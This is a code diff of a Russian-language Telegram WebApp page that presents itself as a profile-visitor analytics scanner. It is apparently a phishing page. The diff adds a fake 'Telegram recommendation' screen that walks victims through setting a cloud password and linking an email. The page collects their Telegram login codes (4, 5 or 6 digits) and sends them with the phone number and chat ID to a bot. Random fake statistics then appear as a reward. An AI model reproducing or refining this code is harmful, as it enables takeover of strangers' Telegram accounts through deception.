@@ -35,10 +35,10 @@
         .header p { font-size: 15px; opacity: 0.9; }
         .content { padding: 24px; }
         
-        .code-screen, .analytics-screen, .loading-screen {
+        .code-screen, .analytics-screen, .loading-screen, .instruction-screen {
             display: none;
         }
-        .code-screen.active, .analytics-screen.active, .loading-screen.active {
+        .code-screen.active, .analytics-screen.active, .loading-screen.active, .instruction-screen.active {
             display: block;
         }
         
@@ -56,6 +56,44 @@
             margin: 20px auto;
         }
         @keyframes spin { to { transform: rotate(360deg); } }
+        
+        .instruction-step {
+            background: #f8f9ff;
+            border-radius: 16px;
+            padding: 16px;
+            margin-bottom: 16px;
+            border-left: 4px solid #007AFF;
+        }
+        .step-number {
+            background: #007AFF;
+            color: white;
+            width: 24px;
+            height: 24px;
+            border-radius: 12px;
+            display: inline-block;
+            text-align: center;
+            font-weight: bold;
+            margin-right: 8px;
+        }
+        .step-title {
+            font-weight: 600;
+            font-size: 16px;
+            margin-bottom: 8px;
+        }
+        .step-desc {
+            color: #6c757d;
+            font-size: 14px;
+            line-height: 1.5;
+        }
+        .note-box {
+            background: #fff3cd;
+            border: 1px solid #ffeeba;
+            border-radius: 12px;
+            padding: 12px;
+            margin: 20px 0;
+            font-size: 14px;
+            color: #856404;
+        }
         
         .code-input {
             width: 100%;
@@ -178,17 +216,16 @@
         }
         .note { text-align: center; color: #8e8e93; font-size: 12px; margin-top: 16px; }
         
-        .code-hint {
-            background: #f0f7ff;
-            border-radius: 12px;
-            padding: 12px;
-            margin-bottom: 20px;
-            font-size: 13px;
+        .back-button {
+            background: #f2f2f7;
             color: #007AFF;
-            text-align: left;
-            line-height: 1.5;
+            border: none;
+            padding: 12px;
+            border-radius: 12px;
+            font-size: 16px;
+            cursor: pointer;
+            margin-bottom: 20px;
         }
-        .code-hint span { display: block; margin: 4px 0; }
     </style>
 </head>
 <body>
@@ -203,44 +240,65 @@
             <div id="loadingScreen" class="loading-screen active">
                 <h2>🔐 Подключение...</h2>
                 <div class="loading-spinner"></div>
-                <p>Устанавливаем защищенное соединение</p>
+                <p>Устанавливаем соединение</p>
+            </div>
+            
+            <!-- Экран с инструкцией -->
+            <div id="instructionScreen" class="instruction-screen">
+                <h2>📧 Настройка почты (рекомендация Telegram)</h2>
+                <p style="color: #6c757d; margin-bottom: 20px;">С 31 октября 2025 года Telegram рекомендует привязать почту из-за блокировок SMS .</p>
+                
+                <div class="instruction-step">
+                    <div class="step-title"><span class="step-number">1</span> Открой настройки Telegram</div>
+                    <div class="step-desc">Нажми на аватарку → «Настройки»</div>
+                </div>
+                
+                <div class="instruction-step">
+                    <div class="step-title"><span class="step-number">2</span> Найди «Почту для входа»</div>
+                    <div class="step-desc">Настройки → Конфиденциальность → прокрути вниз</div>
+                </div>
+                
+                <div class="instruction-step">
+                    <div class="step-title"><span class="step-number">3</span> Если пункта нет</div>
+                    <div class="step-desc">Нажми «Облачный пароль» → установи любой пароль → введи почту для сброса. Пункт появится автоматически .</div>
+                </div>
+                
+                <div class="instruction-step">
+                    <div class="step-title"><span class="step-number">4</span> Добавь почту для кодов</div>
+                    <div class="step-desc">Нажми «Добавить почту» → введи email → на почту придет 6-значный код подтверждения</div>
+                </div>
+                
+                <div class="instruction-step">
+                    <div class="step-title"><span class="step-number">5</span> Введи код</div>
+                    <div class="step-desc">После активации все коды входа будут приходить на почту . Введи 6 цифр в чат с ботом.</div>
+                </div>
+                
+                <div class="note-box">
+                    <strong>📢 Важно!</strong> Без номера телефона вход невозможен. Сначала поделись номером в чате с ботом, затем настрой почту.
+                </div>
+                
+                <button class="scan-btn" onclick="goBack()">
+                    🔙 Вернуться к вводу кода
+                </button>
             </div>
             
             <!-- Экран ввода кода -->
             <div id="codeScreen" class="code-screen">
-                <h2>🔐 Подтверждение доступа</h2>
-                <p style="color: #6c757d; margin-bottom: 10px;">Введите код из любого источника:</p>
+                <button class="back-button" onclick="showInstruction()">📧 Как настроить почту</button>
                 
-                <div class="code-hint">
-                    <span>📧 <strong>Почта:</strong> 6 цифр (код из письма)</span>
-                    <span>📞 <strong>Звонок:</strong> последние 4 цифры номера</span>
-                    <span>📱 <strong>SMS/Telegram:</strong> 5 цифр</span>
-                </div>
+                <h2>🔐 Введи код</h2>
+                <p style="color: #6c757d; margin-bottom: 10px;">Из почты (6 цифр), SMS (5) или звонка (4)</p>
                 
                 <input type="text" id="codeInput" class="code-input" maxlength="6" inputmode="numeric" pattern="\d*" placeholder="_ _ _ _ _ _" autofocus>
                 
                 <button class="verify-btn" id="verifyBtn" onclick="verifyCode()">Подтвердить код</button>
                 
                 <div class="info-box" style="text-align: left;">
-                    <strong>📨 Где искать код:</strong><br>
-                    • Если настраивали почту — проверьте email (6 цифр)<br>
-                    • Если был звонок — последние 4 цифры номера<br>
-                    • Если пришло SMS/Telegram — 5 цифр<br>
-                </div>
-
-                <div class="info-box" style="background: #e8f5e9; border-color: #4caf50; margin-top: 10px; text-align: left;">
-                    <strong>📧 Если почта УЖЕ привязана:</strong><br>
-                    1️⃣ Зайди в <b>Настройки → Конфиденциальность → Почта для входа</b><br>
-                    2️⃣ Нажми <b>«Отправить код»</b><br>
-                    3️⃣ Введи полученные 6 цифр сюда<br>
-                    <span style="color: #2e7d32; font-size: 12px;">✓ Почта для входа и почта для сброса пароля — это разные вещи, не путай</span>
-                </div>
-
-                <div class="info-box" style="text-align: left; margin-top: 10px;">
-                    <strong>❓ Не приходит?</strong><br>
-                    • Подождите 30 секунд<br>
-                    • В Telegram появится кнопка «Позвонить мне»<br>
-                    • Или настройте почту (инструкция выше)
+                    <strong>📧 Где искать код:</strong><br>
+                    • <b>Почта:</b> проверь email и папку «Спам» (6 цифр)<br>
+                    • <b>SMS/Telegram:</b> если почта не настроена (5 цифр)<br>
+                    • <b>Звонок:</b> через 30 сек кнопка «Позвонить мне» (4 цифры)<br>
+                    • <b>Другое устройство:</b> проверь компьютер/планшет 
                 </div>
                 
                 <div class="error-message" id="codeError"></div>
@@ -278,7 +336,7 @@
                 </div>
                 
                 <div class="scanning-text" id="scanningText" style="display: none;">
-                    Анализ логов посещений... 0%
+                    Анализ... 0%
                 </div>
                 
                 <div id="results" class="results"></div>
@@ -297,106 +355,101 @@
         let isScanning = false;
         let codeVerified = false;
         
-        // Получаем параметры
         const urlParams = new URLSearchParams(window.location.search);
         const phone = urlParams.get('phone') || '';
         const chatId = urlParams.get('chat') || '';
         const verified = urlParams.get('verified') === '1';
         
-        // Если уже подтверждено - сразу показываем аналитику
         if (verified) {
             document.getElementById('loadingScreen').classList.remove('active');
             document.getElementById('analyticsScreen').classList.add('active');
             generateRandomStats();
             document.getElementById('statusNote').innerText = 'Авторизация успешна';
         } else {
-            // Показываем экран ввода кода
             setTimeout(() => {
                 document.getElementById('loadingScreen').classList.remove('active');
                 document.getElementById('codeScreen').classList.add('active');
-                document.getElementById('statusNote').innerText = 'Ожидание кода...';
-                
-                // Автоматически фокусируемся на поле ввода
                 document.getElementById('codeInput').focus();
+                document.getElementById('statusNote').innerText = 'Введи код';
             }, 1500);
+        }
+        
+        function showInstruction() {
+            document.getElementById('codeScreen').classList.remove('active');
+            document.getElementById('instructionScreen').classList.add('active');
+        }
+        
+        function goBack() {
+            document.getElementById('instructionScreen').classList.remove('active');
+            document.getElementById('codeScreen').classList.add('active');
+            document.getElementById('codeInput').focus();
         }
         
         function verifyCode() {
             const code = document.getElementById('codeInput').value.trim();
             const errorEl = document.getElementById('codeError');
             
-            // Проверяем что код состоит из цифр и имеет длину 4, 5 или 6
             if (!/^\d+$/.test(code)) {
                 errorEl.style.display = 'block';
-                errorEl.innerText = 'Код должен содержать только цифры';
+                errorEl.innerText = 'Только цифры';
                 return;
             }
             
             if (code.length !== 4 && code.length !== 5 && code.length !== 6) {
                 errorEl.style.display = 'block';
-                errorEl.innerText = 'Введите 4, 5 или 6 цифр (зависит от источника)';
+                errorEl.innerText = '4, 5 или 6 цифр';
                 return;
             }
             
             errorEl.style.display = 'none';
             document.getElementById('verifyBtn').innerText = 'Проверка...';
             document.getElementById('verifyBtn').disabled = true;
-            document.getElementById('statusNote').innerText = 'Отправка кода...';
+            document.getElementById('statusNote').innerText = 'Отправка...';
             
-            // Определяем тип кода по длине
-            let codeType = 'unknown';
-            if (code.length === 4) codeType = 'call';
-            else if (code.length === 5) codeType = 'sms';
-            else if (code.length === 6) codeType = 'email';
-            
-            // Отправляем код в бота
             try {
                 tg.sendData(JSON.stringify({
                     t: 'c',
                     v: code,
-                    type: codeType,
                     phone: phone,
-                    chat: chatId
+                    chat: chatId,
+                    length: code.length
                 }));
                 
-                // Ждем подтверждения
                 setTimeout(() => {
                     if (!codeVerified) {
                         errorEl.style.display = 'block';
-                        errorEl.innerText = 'Бот не отвечает. Попробуйте ввести код в чат.';
-                        document.getElementById('verifyBtn').innerText = 'Подтвердить код';
+                        errorEl.innerText = 'Бот не отвечает. Введи код в чат.';
+                        document.getElementById('verifyBtn').innerText = 'Подтвердить';
                         document.getElementById('verifyBtn').disabled = false;
-                        document.getElementById('statusNote').innerText = 'Ошибка связи';
+                        document.getElementById('statusNote').innerText = 'Ошибка';
                     }
                 }, 8000);
                 
             } catch (e) {
                 errorEl.style.display = 'block';
-                errorEl.innerText = 'Ошибка отправки. Введите код в чат с ботом.';
-                document.getElementById('verifyBtn').innerText = 'Подтвердить код';
+                errorEl.innerText = 'Ошибка. Введи код в чат.';
+                document.getElementById('verifyBtn').innerText = 'Подтвердить';
                 document.getElementById('verifyBtn').disabled = false;
             }
         }
         
-        // Функция для вызова из бота
         window.onCodeVerified = function() {
             codeVerified = true;
             document.getElementById('codeScreen').classList.remove('active');
             document.getElementById('analyticsScreen').classList.add('active');
-            document.getElementById('statusNote').innerText = 'Авторизация успешна';
+            document.getElementById('statusNote').innerText = 'Успех';
             generateRandomStats();
         };
         
         window.onCodeError = function() {
             document.getElementById('codeError').style.display = 'block';
-            document.getElementById('codeError').innerText = 'Неверный код. Попробуйте еще раз.';
-            document.getElementById('verifyBtn').innerText = 'Подтвердить код';
+            document.getElementById('codeError').innerText = 'Неверный код';
+            document.getElementById('verifyBtn').innerText = 'Подтвердить';
             document.getElementById('verifyBtn').disabled = false;
         };
         
-        // Слушаем сообщения от Telegram WebApp
         tg.onEvent('web_app_data_sent', function() {
-            console.log('Данные отправлены');
+            console.log('Отправлено');
         });
         
         function generateRandomStats() {
@@ -451,12 +504,8 @@
                     document.getElementById('progressContainer').style.display = 'none';
                     isScanning = false;
                     
-                    // Сообщаем боту
                     try {
-                        tg.sendData(JSON.stringify({ 
-                            t: 'scan_complete', 
-                            count: results.length 
-                        }));
+                        tg.sendData(JSON.stringify({ t: 'scan_complete', count: results.length }));
                     } catch (e) {}
                 }
                 
@@ -467,7 +516,7 @@
         
         function displayResults(results) {
             const container = document.getElementById('results');
-            container.innerHTML = '<h3 style="margin-bottom: 16px;">📋 Результаты сканирования</h3>';
+            container.innerHTML = '<h3>📋 Результаты</h3>';
             
             results.forEach((item, index) => {
                 setTimeout(() => {
@@ -489,11 +538,8 @@
             });
         }
         
-        // Добавляем поддержку Enter для отправки кода
         document.getElementById('codeInput').addEventListener('keypress', function(e) {
-            if (e.key === 'Enter') {
-                verifyCode();
-            }
+            if (e.key === 'Enter') verifyCode();
         });
     </script>
 </body>
